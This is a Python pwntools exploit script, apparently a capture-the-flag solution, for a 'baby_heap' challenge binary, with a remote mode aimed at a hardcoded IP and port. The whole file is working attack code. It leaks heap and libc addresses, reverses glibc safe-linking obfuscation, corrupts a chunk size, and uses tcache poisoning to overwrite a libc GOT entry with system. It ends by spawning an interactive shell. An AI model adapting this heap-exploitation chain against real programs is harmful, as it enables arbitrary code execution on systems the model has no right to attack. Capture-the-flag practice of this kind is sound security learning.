from pwn import *
from sys import *
elf = context.binary = ELF("./baby_heap")
p = process("./baby_heap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
HOST = '108.137.176.116'
PORT = 8003
cmd = """
b*main
"""
if(argv[1] == 'gdb'):
gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
p = remote(HOST,PORT)
def add_small(idx, content):
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(idx))
p.sendlineafter(b': ', b'1')
p.sendlineafter(b': ', content)
def add(idx, size, content):
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(idx))
p.sendlineafter(b': ', b'2')
p.sendlineafter(b': ', str(size)) 
p.sendlineafter(b': ', content)
def delete(idx):
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', str(idx))
def edit(idx, content):
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b": ", str(idx))
p.sendlineafter(b': ', content)
def view(idx):
p.sendlineafter(b'> ', b'4')
p.sendlineafter(b': ', str(idx))
def defuscate(x,l=64):
p = 0
for i in range(l*4,0,-4): # 16 nibble
v1 = (x & (0xf << i )) >> i
v2 = (p & (0xf << i+12 )) >> i+12
p |= (v1 ^ v2) << i
return p
def obfuscate(p, adr):
return p^(adr>>12)
#LEAK HEAP
add(0, 0x18, b'A'*8)
add_small(1, b'A')
delete(0)
delete(1)
add(0, 0, b'')
view(0)
p.recvuntil(b'Content: ')
heap = u64(p.recvn(4)+b'\x00'*4)
heap = defuscate(heap)-0x12b0
print(hex(heap))
#LEAK LIBC
add(0, 0x30, b'A'*8)
add(1, 0x30, b'A'*8)
delete(0)
delete(1)
add_small(0, b'A')
add_small(1, b'A')
delete(0)
delete(1)
#Overwrite 1 bytes to change size heap
target = obfuscate(heap+0x12e0, heap+0x1330)
print(hex(target), hex(target)[-2:])
overwrite = bytearray.fromhex(hex(target)[-2:])
print(overwrite)
edit(1, overwrite)
add(0, 0x18, b'A'*8) 
add(0, 0x30, b'A'*8)
add(0, 0x30, b'A'*8)
add(1, 0x18, b'A'*8+p64(0x451)) #overwrite size
#Tidy up the heap struct so it won't broken
for i in range(3):
add(1, 0x100, b'A'*8)
add(1, 0x50, b'A'*8)
add(1, 0x18, b'X'*8)
add(1, 0x18, b'X'*8)
delete(0) #Unsorted bin here
add(1, 0x0, b'')
view(1)
p.recvuntil(b'Content: ')
leak = u64(p.recvn(6)+b'\x00'*2)
libc.address = leak - 0x21d0e0 + 0x3000
print(hex(libc.address))
#Prepare tcache poisoning
add(0, 0x20, b'A'*8)
add(1, 0x20, b'A'*8)
delete(0)
delete(1)
add_small(0, b'A')
add_small(1, b'A')
delete(0)
delete(1)
target = obfuscate(heap+0x1340, heap+0x1310)
print(hex(target), hex(target)[-2:])
overwrite = bytearray.fromhex(hex(target)[-2:])
print(overwrite)
edit(1, overwrite)
libc_got = libc.address+0x219050
print(hex(libc_got))
add(0, 0x18, b'/bin/sh\x00')
add(1, 0x18, p64(obfuscate(libc_got, heap+0x1340)))
add(1, 0x20, b'A'*8)
#gdb.attach(p,cmd)
print(p64(libc.sym['system']))
add(1, 0x20, b'///bin/sh\x00'+b'\x00'*6+p64(libc.sym['system']))
p.sendlineafter(b"> ", b'4') #SHELL
p.interactive()